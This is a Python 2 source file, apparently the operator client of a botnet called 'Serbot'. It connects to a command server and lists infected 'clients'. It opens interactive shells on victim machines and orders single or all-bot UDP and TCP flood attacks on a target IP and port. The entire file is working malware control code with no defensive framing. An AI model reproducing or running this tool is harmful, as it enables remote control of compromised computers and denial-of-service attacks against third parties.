#!/usr/bin/env python2

import subprocess, os, sys, time, threading
from socket import *

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: dotcppfile
Twitter: https://twitter.com/dotcppfile
Blog: http://dotcppfile.worpdress.com"
"""

commands = """---------
Commands:
---------
accept                  | Accept connections
list                    | List connections
interact <id>           | Interact with client
udpflood <ip>:<port>    | UDP flood threw client
udpfloodall <ip>:<port> | UDP flood threw All clients
tcpflood <ip>:<port>    | TCP flood threw client
tcpfloodall <ip>:<port> | TCP flood threw All clients
stop                    | Stop interacting with client
clear                   | Clear the console
quit                    | Close all connections and quit
credits                 | Show Credits
help                    | Show this message
\n"""

if (len(sys.argv) == 4):
	host = sys.argv[1]
	port = int(sys.argv[2])
	password = sys.argv[3]
else:
	sys.exit("Usage: client.py <server ip> <server bridge port> <password>")

def main():
	print intro, commands
	try:
		s=socket(AF_INET, SOCK_STREAM)
		s.connect((host,port))
	except:
		sys.exit("[ERROR] Can't connect to server")
	
	s.send(password)

	while 1:
		try:
			command = raw_input("> ")
			if (command == "accept"):
				s.send("accept")
				print s.recv(10240)
			elif (command == "list"):
				print "--------\nClients:\n--------"
				s.send("list")
				print s.recv(10240)
			elif ("interact " in command):
				s.send(command)
				temporary = s.recv(10240)
				print temporary
				if ("ERROR" not in temporary):
					victimpath = s.recv(10240)
					if ("ERROR" not in victimpath):
						while 1:
							data = raw_input(victimpath)
							if (("cd " not in data) and (data != "stop") and (data != "")):
								s.send(data)
								temporary = s.recv(10240)
								print temporary
								if (("udpflood " in data) or ("tcpflood " in data)):
									print "[INFO] You better wait 90 seconds mate...\n"
								if ("ERROR" in temporary):
									break
							elif (data == "stop"):
								s.send("stop")
								print "\n"
								break
							elif ("cd " in data):
								s.send(data)
								victimpath = s.recv(10240)
								if ("ERROR" in victimpath):
									print victimpath
									break
							elif (data == ""):
								print "[ERROR] Nothing to be sent...\n"
					else:
						print victimpath
						break
			elif ("udpfloodall " in command):
				s.send(command)
				print "[INFO] You better wait 90 seconds mate...\n"
			elif ("tcpfloodall " in command):
				s.send(command)
				print "[INFO] You better wait 90 seconds mate...\n"
			elif(command == "clear"):
				if sys.platform == 'win32':
					os.system("cls")
				else:
					os.system("clear")
			elif(command == "quit"):
				s.send("quit")
				s.close()
				break
			elif(command == "help"):
				print commands
			elif(command == "credits"):
				print "--------\nCredits:\n--------\nCoded by: dotcppfile\nTwitter: https://twitter.com/dotcppfile\nBlog: http://dotcppfile.worpdress.com\n"
			else:
				print "[ERROR] Invalid Command\n"
		except KeyboardInterrupt:
			try:
				s.send("quit")
				s.close()
				print ""
				break
			except:
				pass
		except:
			print "[INFO] Connection Closed"
			s.close()
			break
		
main()
